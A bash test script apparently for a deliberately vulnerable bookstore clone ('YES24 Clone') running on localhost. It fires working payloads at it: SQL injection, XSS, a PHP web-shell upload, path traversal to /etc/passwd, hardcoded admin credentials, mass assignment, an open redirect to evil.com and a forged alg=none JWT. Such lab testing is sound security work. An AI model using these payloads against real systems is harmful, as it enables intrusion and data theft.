#!/usr/bin/env bash
# YES24 Clone — Comprehensive Vulnerability Test Script
# Tests all B1-B15 intentional vulnerabilities and reports PASS/FAIL
set -euo pipefail

BASE_URL=${BASE_URL:-http://localhost:8000}
BASE="$BASE_URL/api/v1"
PASS=0
FAIL=0
TOTAL=0

green() { printf "\033[32m%s\033[0m" "$1"; }
red()   { printf "\033[31m%s\033[0m" "$1"; }
bold()  { printf "\033[1m%s\033[0m" "$1"; }

check() {
    local name="$1" result="$2" expect="$3"
    TOTAL=$((TOTAL + 1))
    if echo "$result" | grep -q "$expect"; then
        PASS=$((PASS + 1))
        printf "  [$(green PASS)] %s\n" "$name"
        echo "         Response snippet: $(echo "$result" | head -c 120)"
    else
        FAIL=$((FAIL + 1))
        printf "  [$(red FAIL)] %s\n" "$name"
        echo "         Expected: $expect"
        echo "         Got: $(echo "$result" | head -c 200)"
    fi
    echo
}

echo ""
bold "============================================================"; echo
bold "   YES24 Clone — Vulnerability Test Suite (B1-B15)"; echo
bold "============================================================"; echo
echo "Target: $BASE_URL"
echo ""

# ─── Health Check ──────────────────────────────────────────────────────
bold "--- Health Check ---"; echo
HEALTH=$(curl -s "$BASE_URL/healthz")
check "Health check" "$HEALTH" "ok"

# ─── Register test user & get session ──────────────────────────────────
TS=$(date +%s)
TEST_EMAIL="vulntest_${TS}@test.com"
REGISTER=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"username\":\"testuser_${TS}\",\"password\":\"test1234\"}")

COOKIE=$(echo "$REGISTER" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('user',{}).get('id',''))" 2>/dev/null || echo "")

# Login to get session cookie
LOGIN=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"test1234\"}")
SESSION=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null || echo "")
USER_ID=$(echo "$LOGIN" | python3 -c "import sys,json; print(json.load(sys.stdin).get('user',{}).get('id',''))" 2>/dev/null || echo "")

if [ -z "$SESSION" ]; then
    echo "WARNING: Could not get session token. Some tests may fail."
fi
echo "Test user: $TEST_EMAIL (session: ${SESSION:0:16}...)"
echo ""

# ─── B1: SQL Injection ────────────────────────────────────────────────
bold "--- B1: SQL Injection ---"; echo

R=$(curl -s "$BASE/search/raw?q=' OR 1=1--")
check "[B1.1] SQL Injection - Raw Search (OR 1=1)" "$R" "title"

R=$(curl -s "$BASE/users/lookup?username=' OR '1'='1")
check "[B1.2] SQL Injection - User Lookup" "$R" "email"

R=$(curl -s "$BASE/search?q=test&legacy=1")
check "[B1.3] SQL Injection - Legacy Search Mode" "$R" "items"

# ─── B2: Stored XSS ──────────────────────────────────────────────────
bold "--- B2: Stored XSS ---"; echo

XSS_REG=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"xss_${TS}@test.com\",\"username\":\"<script>alert(1)</script>\",\"password\":\"test1234\"}")
check "[B2.1] XSS in username (register)" "$XSS_REG" "회원가입"

if [ -n "$SESSION" ]; then
    R=$(curl -s -X POST "$BASE/products/100000001/reviews" \
      -H "Content-Type: application/json" \
      -b "ASP.NET_SessionId=$SESSION" \
      -d '{"rating":5,"title":"<img src=x onerror=alert(1)>","content":"<script>alert(\"xss\")</script>"}')
    check "[B2.2] XSS in review content" "$R" "리뷰\|등록"
fi

R=$(curl -s "$BASE/products/100000001/reviews/raw")
check "[B2.3] Raw HTML reviews (XSS rendering)" "$R" "<html>\|html"

# ─── B3: IDOR ────────────────────────────────────────────────────────
bold "--- B3: IDOR ---"; echo

R=$(curl -s "$BASE/orders/1")
check "[B3.1] IDOR - View any order (no auth)" "$R" "order_no\|total_amount\|not found"

R=$(curl -s "$BASE/users/1")
check "[B3.2] IDOR - View any user + password_hash" "$R" "password_hash"

R=$(curl -s -X PUT "$BASE/reviews/1" \
  -H "Content-Type: application/json" \
  -d '{"content":"IDOR test","rating":1}')
check "[B3.3] IDOR - Edit any review (no auth)" "$R" "updated\|수정\|not found"

R=$(curl -s -X DELETE "$BASE/orders/1/cancel")
check "[B3.4] IDOR - Cancel any order (no auth)" "$R" "cancelled\|취소"

# ─── B4: Broken Authentication ────────────────────────────────────────
bold "--- B4: Broken Authentication ---"; echo

for i in 1 2 3 4 5; do
  curl -s -X POST "$BASE/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"wrong${i}\"}" > /dev/null
done
R=$(curl -s -X POST "$BASE/auth/login" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"test1234\"}")
check "[B4.1] No rate limiting (6th attempt succeeds)" "$R" "access_token\|로그인"

R=$(curl -s "$BASE/auth/debug-session?session_id=$SESSION")
check "[B4.2] Debug session info leak" "$R" "user_id\|email"

R=$(curl -s -X POST "$BASE/auth/admin-login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}')
check "[B4.3] Hardcoded admin credentials" "$R" "access_token\|Admin"

R=$(curl -s "$BASE/auth/sessions")
check "[B4.4] Session enumeration" "$R" "sessions\|total"

# ─── B5: Sensitive Data Exposure ──────────────────────────────────────
bold "--- B5: Sensitive Data Exposure ---"; echo

R=$(curl -s "$BASE/config")
check "[B5.1] Config endpoint (DB creds)" "$R" "database_url"

R=$(curl -s "$BASE/search/raw?q='")
check "[B5.2] Stack trace in errors" "$R" "traceback\|error\|Traceback"

R=$(curl -s "$BASE/users/1")
check "[B5.3] Password hash exposure" "$R" "password_hash"

R=$(curl -sI "$BASE_URL/healthz" 2>/dev/null)
check "[B5.4] X-Debug-Info header" "$R" "X-Debug-Info\|X-Powered-By"

# ─── B6: SSRF ────────────────────────────────────────────────────────
bold "--- B6: SSRF ---"; echo

R=$(curl -s -X POST "$BASE/products/fetch-cover" \
  -H "Content-Type: application/json" \
  -d "{\"url\":\"$BASE_URL/healthz\"}")
check "[B6.1] SSRF - fetch-cover (local)" "$R" "status_code\|body"

R=$(curl -s -X POST "$BASE/webhooks/notify" \
  -H "Content-Type: application/json" \
  -d "{\"callback_url\":\"$BASE_URL/healthz\",\"data\":{\"test\":1}}")
check "[B6.2] SSRF - webhook notify" "$R" "status_code"

# ─── B7: Insecure File Upload ────────────────────────────────────────
bold "--- B7: Insecure File Upload ---"; echo

echo '<?php system($_GET["cmd"]); ?>' > /tmp/test_shell.php
R=$(curl -s -X POST "$BASE/upload/profile-image" \
  -F "file=@/tmp/test_shell.php" 2>/dev/null || echo '{"error":"minio_unavailable"}')
check "[B7.1] Upload PHP file (no validation)" "$R" "filename\|uploaded\|error"
rm -f /tmp/test_shell.php

# ─── B8: Mass Assignment ─────────────────────────────────────────────
bold "--- B8: Mass Assignment ---"; echo

R=$(curl -s -X PUT "$BASE/users/1" \
  -H "Content-Type: application/json" \
  -d '{"is_admin":true,"point_balance":999999}')
check "[B8.1] Mass assign is_admin + points" "$R" "updated\|fields_updated"

R=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"massassign_${TS}@test.com\",\"username\":\"mass\",\"password\":\"test1234\",\"is_admin\":true}")
check "[B8.2] Register with is_admin=true" "$R" "회원가입"

# ─── B9: Weak Session ────────────────────────────────────────────────
bold "--- B9: Weak Session ---"; echo

R=$(curl -s -X POST "$BASE/auth/login-weak" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\",\"password\":\"test1234\"}")
check "[B9.1] Weak MD5 session login" "$R" "access_token"

R=$(curl -s "$BASE/auth/token-preview?email=${TEST_EMAIL}")
check "[B9.2] Token prediction" "$R" "predicted_token"

# ─── B10: CSRF — Transfer Points ─────────────────────────────────────
bold "--- B10: CSRF ---"; echo

# Register second user to transfer to
REG2=$(curl -s -X POST "$BASE/auth/register" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"target_${TS}@test.com\",\"username\":\"target\",\"password\":\"test1234\"}")
TARGET_ID=$(echo "$REG2" | python3 -c "import sys,json; print(json.load(sys.stdin).get('user',{}).get('id','2'))" 2>/dev/null || echo "2")

R=$(curl -s -X POST "$BASE/vuln/transfer-points" \
  -H "Content-Type: application/json" \
  -b "ASP.NET_SessionId=$SESSION" \
  -d "{\"to_user_id\":${TARGET_ID},\"amount\":100}")
check "[B10.1] CSRF - Transfer points (no CSRF token)" "$R" "포인트\|전송\|transfer"

# ─── B11: Open Redirect + Info Disclosure ────────────────────────────
bold "--- B11: Open Redirect & Info Disclosure ---"; echo

R=$(curl -s -o /dev/null -w "%{redirect_url}" "$BASE/vuln/redirect?url=https://evil.com/phish")
check "[B11.1] Open Redirect" "$R" "evil.com"

R=$(curl -s -X POST "$BASE/auth/forgot-password" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\"}")
check "[B11.2] Password reset token in response" "$R" "reset_token"

R=$(curl -s -X POST "$BASE/auth/send-verification" \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"${TEST_EMAIL}\"}")
check "[B11.3] Verification code in response" "$R" "verification_code"

# ─── B12: Broken Access Control + Command Injection ──────────────────
bold "--- B12: Broken Access Control ---"; echo

R=$(curl -s "$BASE/admin/users" -H "X-Admin: true")
check "[B12.1] Admin users - client-side header bypass" "$R" "email\|username"

R=$(curl -s "$BASE/admin/stats" -H "X-Admin: true")
check "[B12.2] Admin stats - client-side header bypass" "$R" "total_users\|total_orders"

# ─── B13: Command Injection ──────────────────────────────────────────
bold "--- B13: Command Injection ---"; echo

R=$(curl -s "$BASE/vuln/ping?host=127.0.0.1")
check "[B13.1] Command Injection - Ping" "$R" "stdout\|returncode"

R=$(curl -s "$BASE/admin/logs?filter=auth" -H "X-Admin: true")
check "[B13.2] Command Injection - Admin logs filter" "$R" "logs\|auth"

# ─── B14: Path Traversal ─────────────────────────────────────────────
bold "--- B14: Path Traversal ---"; echo

R=$(curl -s "$BASE/vuln/file?path=../../etc/passwd")
check "[B14.1] Path Traversal - /etc/passwd" "$R" "root\|content\|not found\|error"

# ─── B15: ReDoS ──────────────────────────────────────────────────────
bold "--- B15: ReDoS ---"; echo

R=$(curl -s -X POST "$BASE/vuln/validate-email" \
  -H "Content-Type: application/json" \
  -d '{"email":"aaaaaa"}')
check "[B15.1] ReDoS - validate-email (short input)" "$R" "processing_time_ms\|valid"

# ─── B16: JWT None Algorithm ─────────────────────────────────────────
bold "--- B16: JWT None Algorithm ---"; echo

R=$(curl -s -X POST "$BASE/vuln/jwt-login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","role":"admin"}')
check "[B16.1] JWT login (HS256 weak secret)" "$R" "token"

# Forge a JWT with alg=none
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_')
PAYLOAD=$(echo -n '{"sub":"hacker","role":"admin","iat":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')
FORGED_TOKEN="${HEADER}.${PAYLOAD}."

R=$(curl -s "$BASE/vuln/jwt-profile" \
  -H "Authorization: Bearer ${FORGED_TOKEN}")
check "[B16.2] JWT alg=none bypass" "$R" "hacker\|admin\|role"

# ─── Summary ──────────────────────────────────────────────────────────
echo ""
bold "==================== SUMMARY ===================="; echo
printf "\n"
printf "  %-45s %s\n" "Category" "Tests"
printf "  %-45s %s\n" "────────────────────────────────────────────" "─────"
printf "  %-45s %s\n" "B1  SQL Injection" "3"
printf "  %-45s %s\n" "B2  Stored XSS" "3"
printf "  %-45s %s\n" "B3  IDOR" "4"
printf "  %-45s %s\n" "B4  Broken Authentication" "4"
printf "  %-45s %s\n" "B5  Sensitive Data Exposure" "4"
printf "  %-45s %s\n" "B6  SSRF" "2"
printf "  %-45s %s\n" "B7  Insecure File Upload" "1"
printf "  %-45s %s\n" "B8  Mass Assignment" "2"
printf "  %-45s %s\n" "B9  Weak Session" "2"
printf "  %-45s %s\n" "B10 CSRF" "1"
printf "  %-45s %s\n" "B11 Open Redirect & Info Disclosure" "3"
printf "  %-45s %s\n" "B12 Broken Access Control" "2"
printf "  %-45s %s\n" "B13 Command Injection" "2"
printf "  %-45s %s\n" "B14 Path Traversal" "1"
printf "  %-45s %s\n" "B15 ReDoS" "1"
printf "  %-45s %s\n" "B16 JWT None Algorithm" "2"
printf "\n"
echo "  Total:  $TOTAL"
printf "  $(green "PASS"):   %d\n" "$PASS"
printf "  $(red "FAIL"):   %d\n" "$FAIL"
echo ""

if [ "$FAIL" -eq 0 ]; then
    green "All vulnerability tests passed!"; echo
else
    red "$FAIL test(s) failed — check output above."; echo
fi

echo ""
bold "[SUMMARY] $PASS/$TOTAL tests passed"; echo
exit $FAIL
